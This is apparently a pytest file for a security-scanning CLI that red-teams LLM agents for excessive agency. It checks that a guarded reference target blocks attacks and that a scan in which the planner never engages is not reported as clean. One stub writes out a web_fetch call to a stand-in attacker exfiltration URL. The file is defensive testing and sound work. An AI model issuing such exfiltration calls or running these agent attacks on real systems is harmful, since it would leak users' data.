"""Offline + gated-live CLI e2e tests for ``mylonite gate``.

Part A: Offline no-finding path
    Monkeypatches ``litellm.acompletion`` to return a benign text response with
    no tool calls, so the in-process reference planner terminates immediately,
    the deterministic predicates produce no-finding, the judge LLM fallback
    (also via acompletion) returns success=False, and ``scan_fn`` yields zero
    exploits.  ``run_gate`` then short-circuits at the empty-exploits check
    (line 42 of orchestrator.py) — before generate/validate — and exits 0.

Part B: Gated live test
    Full real flow (real Haiku), gated behind MYLONITE_LIVE_E2E=1.
"""

from __future__ import annotations

import asyncio
import json
import os
import subprocess
from pathlib import Path
from types import SimpleNamespace
from typing import Any

import pytest
from typer.testing import CliRunner

from mylonite.cli import app

runner = CliRunner()


# ---------------------------------------------------------------------------
# Shared benign completion stub
# ---------------------------------------------------------------------------


def _benign_response() -> SimpleNamespace:
    """Return a minimal LiteLLM-shaped response: text content, no tool calls.

    The planner (LLMPlanner.run) reads:
        message = response.choices[0].message
        tool_calls = getattr(message, "tool_calls", None) or []
        content = getattr(message, "content", None) or ""

    When tool_calls is empty the planner returns immediately with a PlannerTrace
    (kind="say" + kind="stop"), so the adapter.invoke() completes without calling
    any MCP tools.  The judge's deterministic predicates then inspect the
    response and find no tool-call evidence → no finding.

    The customiser and judge also call litellm.acompletion via
    litellm_json_call_async; for the customiser a non-JSON text response is
    fine — it falls back to the seed body unchanged.  For the LLM-judge fallback
    we return {"success": false, "confidence": 0.0, "reason": "benign stub"}
    so no finding is emitted even on the LLM-judge code path.

    A single callable works for all three callers because:
    * The planner checks for tool_calls (absent here → terminates).
    * The customiser expects {"body": "..."} — gets fallback on non-JSON → fine.
    * The judge expects {"success": bool, "confidence": float, "reason": str} —
      we embed a JSON object in the content so it parses as "not success".
    """
    content = json.dumps({"success": False, "confidence": 0.0, "reason": "benign stub"})
    message = SimpleNamespace(content=content, tool_calls=None)
    choice = SimpleNamespace(message=message)
    usage = SimpleNamespace(prompt_tokens=0, completion_tokens=1, total_tokens=1)
    return SimpleNamespace(choices=[choice], usage=usage)


async def _benign_acompletion(*args: object, **kwargs: object) -> SimpleNamespace:
    """Async stub for litellm.acompletion — returns a benign, tool-call-free response."""
    return _benign_response()


# ---------------------------------------------------------------------------
# Part A — Offline no-finding e2e
# ---------------------------------------------------------------------------


def _benign_tool_call_response() -> SimpleNamespace:
    """One harmless `read_note` call — a planner's opening turn."""
    call = SimpleNamespace(
        id="c1",
        function=SimpleNamespace(name="read_note", arguments=json.dumps({"note_id": "n_absent"})),
    )
    message = SimpleNamespace(content="", tool_calls=[call])
    choice = SimpleNamespace(message=message)
    usage = SimpleNamespace(prompt_tokens=0, completion_tokens=1, total_tokens=1)
    return SimpleNamespace(choices=[choice], usage=usage)


def _engaging_acompletion() -> Any:
    """Calls one benign tool per planner conversation, then terminates.

    Keyed off the request shape rather than a call counter: a scan runs many
    attempts through the same patched function, so a counter would engage the
    tool surface on the first attempt only.
    """

    async def _acompletion(*_args: object, **kwargs: object) -> SimpleNamespace:
        if not kwargs.get("tools"):
            return _benign_response()
        messages = kwargs.get("messages") or []
        if any(isinstance(m, dict) and m.get("role") == "tool" for m in messages):  # type: ignore[union-attr]
            return _benign_response()
        return _benign_tool_call_response()

    return _acompletion


def _reference_scan_report(variant: str, acompletion: Any) -> Any:
    """Run the same scan `gate` runs for `reference:<variant>`, directly, so a
    test can read per-attempt outcomes that the CLI's own output doesn't carry.

    Builds the identical engine `make_scan_fn` (gate/wiring.py) assembles for
    the reference route, under `acompletion` patched the same way the CLI
    invocation in the caller's test is. Deterministic and keyed off request
    shape (see `_engaging_acompletion`'s docstring), so running it twice —
    once through the CLI, once here — gives the same result.
    """
    import litellm

    from mylonite.plugins._reference.reference_target_adapter import InProcessReferenceAdapter
    from mylonite.scan.assembly import build_scan_engine, load_attack_modules, select_attack_modules
    from mylonite.scan.engine import ScanConfig

    original_acompletion = litellm.acompletion
    original_completion = litellm.completion
    litellm.acompletion = acompletion
    litellm.completion = lambda *a, **kw: _benign_response()
    try:
        adapter = InProcessReferenceAdapter(variant=variant, model="stub")
        all_modules, module_load_failures = load_attack_modules()
        attack_modules = select_attack_modules(all_modules)
        config = ScanConfig(
            target_id=f"reference:{variant}",
            provider="anthropic",
            model="stub",
        )
        engine = build_scan_engine(
            config,
            adapter,
            attack_modules=attack_modules,
            module_load_failures=module_load_failures,
        )
        result = asyncio.run(engine.run())
    finally:
        litellm.acompletion = original_acompletion
        litellm.completion = original_completion
    return result.report


def test_gate_planner_that_declines_direct_requests_is_not_clean(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The F9 false clean: a planner that never calls the tool a direct seed's
    OWN user message asks for measured the planner declining, not the target
    resisting. `gate` must read that as incomplete coverage, not a clean pass.

    Same read_note-only stub as before (`_engaging_acompletion`): ONE harmless
    tool call per attempt, then terminate. Against `reference:vulnerable`,
    that stub never calls `send_email` or `web_fetch` — the two tools the
    direct seeds' user messages ask for outright — so those two attempts are
    `skipped_planner_no_engagement`, and `gate` exits 2 (incomplete coverage,
    nothing found), not 0.

    See `test_gate_reference_guarded_blocks_the_literal_direct_requests_exits_zero`
    below for the real exit-0 path, and
    `test_gate_exits_nonzero_when_the_planner_never_engages` for the
    zero-tool-calls-at-all variant of this same false clean.
    """
    import litellm

    monkeypatch.setattr(litellm, "acompletion", _engaging_acompletion())
    # Also patch the sync path (used by doctor / litellm_json_call sync) in
    # case any branch under test uses it; the gate path is async-only but be safe.
    monkeypatch.setattr(litellm, "completion", lambda *a, **kw: _benign_response())
    # T14: gate now pre-flights require_llm_configured() before any litellm
    # call is attempted -- litellm itself is fully stubbed above, so a fake
    # key just needs to be PRESENT, never actually used.
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")

    monkeypatch.chdir(tmp_path)
    out_dir = tmp_path / ".mylonite" / "gate"
    res = runner.invoke(app, ["gate", "reference:vulnerable", "--out", str(out_dir)])

    assert res.exit_code == 2, (
        f"Expected exit 2 (incomplete coverage, nothing found), got {res.exit_code}."
        f"\nOutput:\n{res.output}"
    )
    assert "MYL-NT-003" in res.output, res.output
    # No gate artefacts should be written (short-circuit happens before generate).
    assert not out_dir.exists() or not list(out_dir.glob("exploit_*.json")), (
        "No exploit JSON should be written when the scan found nothing."
    )

    # The CLI output names the dominant cause but not which attempts it was —
    # confirm those directly against a report from the same deterministic stub.
    report = _reference_scan_report("vulnerable", _engaging_acompletion())
    outcomes = {a.pattern_id: a.outcome for a in report.attempts}
    assert outcomes["excessive-agency-send-email-direct-unconfirmed"] == (
        "skipped_planner_no_engagement"
    )
    assert outcomes["excessive-agency-fetch-attacker-url-direct"] == (
        "skipped_planner_no_engagement"
    )


def _direct_request_acompletion() -> Any:
    """Calls the literal tool a direct seed's own user message asks for
    (`send_email` or `web_fetch`), and otherwise makes one harmless `read_note`
    call, then terminates — like `_engaging_acompletion`, but targeted.

    Used against `reference:guarded`: the planner genuinely engages the tool
    the direct seeds ask for, so there is no non-engagement gap, and it is the
    guard itself — `send_email` only stages, `web_fetch` refuses an
    unallowlisted host — that stops the attack.
    """

    async def _acompletion(*_args: object, **kwargs: object) -> SimpleNamespace:
        if not kwargs.get("tools"):
            return _benign_response()
        messages = kwargs.get("messages") or []
        if any(isinstance(m, dict) and m.get("role") == "tool" for m in messages):  # type: ignore[union-attr]
            return _benign_response()
        user_text = " ".join(
            str(m.get("content") or "")
            for m in messages
            if isinstance(m, dict) and m.get("role") == "user"
        )
        if "send_email" in user_text or "send an email" in user_text:
            call = SimpleNamespace(
                id="c1",
                function=SimpleNamespace(
                    name="send_email",
                    arguments=json.dumps(
                        {
                            "to": "ops@example.com",
                            "subject": "Status update",
                            "body": "All systems nominal.",
                        }
                    ),
                ),
            )
        elif "fetch" in user_text and "attacker.example.com" in user_text:
            call = SimpleNamespace(
                id="c1",
                function=SimpleNamespace(
                    name="web_fetch",
                    arguments=json.dumps({"url": "http://attacker.example.com/exfil"}),
                ),
            )
        else:
            return _benign_tool_call_response()
        message = SimpleNamespace(content="", tool_calls=[call])
        choice = SimpleNamespace(message=message)
        usage = SimpleNamespace(prompt_tokens=0, completion_tokens=1, total_tokens=1)
        return SimpleNamespace(choices=[choice], usage=usage)

    return _acompletion


def test_gate_reference_guarded_blocks_the_literal_direct_requests_exits_zero(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A real exit-0 path for the direct seeds: the planner calls the exact
    tool each one asks for — so there is no non-engagement gap — and the
    guarded twin's own controls are what stop it (`send_email` stages without
    dispatching; `web_fetch` refuses the unallowlisted host). `gate` has no
    `--weakness-class`, so this runs the full catalogue, same as
    `test_gate_planner_that_declines_direct_requests_is_not_clean` above;
    every other seed's request falls through to the same harmless `read_note`
    call that test already covers.
    """
    import litellm

    monkeypatch.setattr(litellm, "acompletion", _direct_request_acompletion())
    monkeypatch.setattr(litellm, "completion", lambda *a, **kw: _benign_response())
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")

    monkeypatch.chdir(tmp_path)
    out_dir = tmp_path / ".mylonite" / "gate"
    res = runner.invoke(app, ["gate", "reference:guarded", "--out", str(out_dir)])

    assert res.exit_code == 0, (
        f"Expected exit 0 (no exploit found), got {res.exit_code}.\nOutput:\n{res.output}"
    )
    assert "nothing to gate" in res.output.lower() or "no exploit" in res.output.lower(), (
        f"Expected 'nothing to gate' or 'no exploit' in output.\nOutput:\n{res.output}"
    )
    assert not out_dir.exists() or not list(out_dir.glob("exploit_*.json")), (
        "No exploit JSON should be written when the scan found nothing."
    )


def test_gate_exits_nonzero_when_the_planner_never_engages(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """A gate must not go green on a run in which nothing was exercised.

    This is the false-clean the `skipped_planner_no_engagement` outcome exists
    to close, pinned at the level a user actually experiences it. The stub never
    calls a tool, so every attempt is delivered but never exercised. That is not
    evidence the target is defended -- it is an absence of evidence -- and the
    gate must refuse to pass on it rather than report "no exploit found".

    Before, this exact stub produced exit 0 and the reassuring "nothing to gate"
    message: the attack surface was never touched and the tool said so was fine.
    """
    import litellm

    monkeypatch.setattr(litellm, "acompletion", _benign_acompletion)
    monkeypatch.setattr(litellm, "completion", lambda *a, **kw: _benign_response())
    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant-test")

    monkeypatch.chdir(tmp_path)
    out_dir = tmp_path / ".mylonite" / "gate"
    res = runner.invoke(app, ["gate", "reference:vulnerable", "--out", str(out_dir)])

    assert res.exit_code != 0, (
        "A scan in which the planner never touched the tool surface must not "
        f"pass the gate.\nOutput:\n{res.output}"
    )
    assert "not a clean result" in res.output.lower(), res.output
    assert not out_dir.exists() or not list(out_dir.glob("exploit_*.json"))


# ---------------------------------------------------------------------------
# Part B — Gated live e2e (skipped unless MYLONITE_LIVE_E2E=1)
# ---------------------------------------------------------------------------


@pytest.mark.skipif(
    os.environ.get("MYLONITE_LIVE_E2E") != "1",
    reason="live e2e (needs a provider key); set MYLONITE_LIVE_E2E=1 to run",
)
def test_gate_reference_vulnerable_live_prints_pr_command(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """Full real gate flow: real Haiku, reference:vulnerable.

    Expects either:
    - A 'gh pr create' command printed to stdout (kept test, print path), OR
    - An exploit artefact written (finding confirmed but gate artefacts present).

    Runs in a fresh ``git init`` repo so the real branch+commit step works.
    """
    # Set up a fresh git repo in tmp_path so open_or_print_pr can commit.
    subprocess.run(["git", "init", str(tmp_path)], check=True, capture_output=True)
    subprocess.run(
        ["git", "config", "user.email", "test@example.com"],
        cwd=str(tmp_path),
        check=True,
        capture_output=True,
    )
    subprocess.run(
        ["git", "config", "user.name", "Test"],
        cwd=str(tmp_path),
        check=True,
        capture_output=True,
    )
    # Seed an initial commit so checkout -b has a base.
    (tmp_path / "README.md").write_text("init\n", encoding="utf-8")
    subprocess.run(["git", "add", "README.md"], cwd=str(tmp_path), check=True, capture_output=True)
    subprocess.run(
        ["git", "commit", "-m", "init"],
        cwd=str(tmp_path),
        check=True,
        capture_output=True,
    )

    monkeypatch.chdir(tmp_path)
    out_dir = tmp_path / ".mylonite" / "gate"

    res = runner.invoke(
        app,
        ["gate", "reference:vulnerable", "--out", str(out_dir)],
    )

    # Gate exits 0 on both the "no exploit" and the "kept test" paths.
    assert res.exit_code == 0, f"Expected exit 0, got {res.exit_code}.\nOutput:\n{res.output}"

    # Either the scan found nothing (valid — reference scan is stochastic) …
    no_exploit = "nothing to gate" in res.output.lower() or "no exploit" in res.output.lower()
    # … or it found an exploit, generated + validated a test, and printed the PR cmd.
    pr_cmd_printed = "gh pr create" in res.output
    exploit_written = out_dir.exists() and bool(list(out_dir.glob("exploit_*.json")))

    assert no_exploit or pr_cmd_printed or exploit_written, (
        "Expected either 'nothing to gate', 'gh pr create', or an exploit artefact.\n"
        f"Output:\n{res.output}"
    )
